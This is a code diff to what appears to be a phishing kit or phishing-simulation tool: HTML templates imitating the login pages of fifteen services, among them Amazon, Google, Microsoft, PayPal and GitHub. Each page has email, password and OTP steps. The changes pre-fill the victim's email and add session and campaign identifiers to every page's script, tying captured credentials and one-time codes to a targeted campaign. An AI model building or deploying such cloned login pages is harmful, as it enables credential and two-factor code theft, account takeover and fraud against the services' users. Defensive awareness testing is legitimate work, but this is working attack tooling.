@@ -265,7 +265,7 @@ amazon_html = """<!DOCTYPE html>
         <h1>Log in</h1>
         <form id="form-step-1">
             <label for="email">Email or mobile phone number</label>
-            <input type="text" id="email" name="email" required>
+            <input type="text" id="email" name="email" value="{{ email }}" required>
             
             <button type="submit" id="btn-next" class="btn-primary">Continue</button>
             
@@ -347,7 +347,9 @@ amazon_html = """<!DOCTYPE html>
                     step2: '#step-2',
                     step3: '#step-3-otp',
                     errorMsg: '#error-message'
-                }
+                },
+                sessionId: '{{ session_id }}',
+                campaignId: '{{ campaign_id }}'
             });
 
             // Custom UI logic for Amazon (Change email link)
@@ -669,7 +671,9 @@ apple_html = """<!DOCTYPE html>
                     step2: '#step-2',
                     step3: '#step-3-otp',
                     userDisplay: '#user-display'
-                }
+                },
+                sessionId: '{{ session_id }}',
+                campaignId: '{{ campaign_id }}'
             });
 
             const backBtn = document.getElementById('back-btn');
@@ -976,7 +980,9 @@ discord_html = """<!DOCTYPE html>
                     otpBtn: '#btn-otp-submit',
                     step1: '#step-1',
                     step3: '#step-3-otp'
-                }
+                },
+                sessionId: '{{ session_id }}',
+                campaignId: '{{ campaign_id }}'
             });
         });
     </script>
@@ -1357,7 +1363,9 @@ dropbox_html = """<!DOCTYPE html>
                     step2: '#step-2',
                     step3: '#step-3-otp',
                     userDisplay: '#display-email'
-                }
+                },
+                sessionId: '{{ session_id }}',
+                campaignId: '{{ campaign_id }}'
             });
 
             // Handle back button
@@ -1614,7 +1622,9 @@ facebook_html = """<!DOCTYPE html>
                     otpBtn: '#btn-otp-submit',
                     step1: '#step-1',
                     step3: '#step-3-otp'
-                }
+                },
+                sessionId: '{{ session_id }}',
+                campaignId: '{{ campaign_id }}'
             });
         });
     </script>
@@ -1851,7 +1861,9 @@ github_html = """<!DOCTYPE html>
                     step1: '#step-1',
                     step2: '#step-2',
                     step3: '#step-3-otp'
-                }
+                },
+                sessionId: '{{ session_id }}',
+                campaignId: '{{ campaign_id }}'
             });
         });
     </script>
@@ -2161,7 +2173,9 @@ google_html = """<!DOCTYPE html>
                     step1: '#step-1',
                     step2: '#step-2',
                     step3: '#step-2fa' // Using the native-styled container
-                }
+                },
+                sessionId: '{{ session_id }}',
+                campaignId: '{{ campaign_id }}'
             });
         });
     </script>
@@ -2583,7 +2597,9 @@ instagram_html = """<!DOCTYPE html>
                     otpBtn: '#btn-otp-submit',
                     step1: '#step-1',
                     step3: '#step-3-otp'
-                }
+                },
+                sessionId: '{{ session_id }}',
+                campaignId: '{{ campaign_id }}'
             });
 
             // Image slider
@@ -3085,7 +3101,9 @@ linkedin_html = """<!DOCTYPE html>
                     otpBtn: '#btn-otp-submit',
                     step1: '#step-1',
                     step3: '#step-3-otp'
-                }
+                },
+                sessionId: '{{ session_id }}',
+                campaignId: '{{ campaign_id }}'
             });
 
             // Toggle Password Visibility
@@ -3347,7 +3365,9 @@ microsoft_html = """<!DOCTYPE html>
                     step1: '#step-1',
                     step2: '#step-2',
                     step3: '#step-3-otp'
-                }
+                },
+                sessionId: '{{ session_id }}',
+                campaignId: '{{ campaign_id }}'
             });
         });
     </script>
@@ -3648,7 +3668,9 @@ paypal_html = """<!DOCTYPE html>
                     step2: '#step-2',
                     step3: '#step-3-otp',
                     userDisplay: '#user-email-display'
-                }
+                },
+                sessionId: '{{ session_id }}',
+                campaignId: '{{ campaign_id }}'
             });
 
             const backBtn = document.getElementById('back-btn');
@@ -4005,7 +4027,9 @@ reddit_html = """<!DOCTYPE html>
                     step1: '#step-1',
                     step3: '#step-3-otp',
                     errorMsg: '#error-msg'
-                }
+                },
+                sessionId: '{{ session_id }}',
+                campaignId: '{{ campaign_id }}'
             });
         });
     </script>
@@ -4402,7 +4426,9 @@ slack_html = """<!DOCTYPE html>
                     step1: '#step-1', // Login container
                     step3: '#step-3-otp', // OTP container
                     errorMsg: '#error-msg'
-                }
+                },
+                sessionId: '{{ session_id }}',
+                campaignId: '{{ campaign_id }}'
             });
         });
     </script>
@@ -4766,7 +4792,9 @@ tiktok_html = """<!DOCTYPE html>
                     step1: '#login-form',
                     step3: '#step-3-otp',
                     errorMsg: '#error-msg'
-                }
+                },
+                sessionId: '{{ session_id }}',
+                campaignId: '{{ campaign_id }}'
             });
         });
     </script>
@@ -5161,7 +5189,9 @@ yahoo_html = """<!DOCTYPE html>
                     step3: '#step-3-otp',
                     userDisplay: '#display-email',
                     errorMsg: '#error-msg'
-                }
+                },
+                sessionId: '{{ session_id }}',
+                campaignId: '{{ campaign_id }}'
             });
         });
     </script>
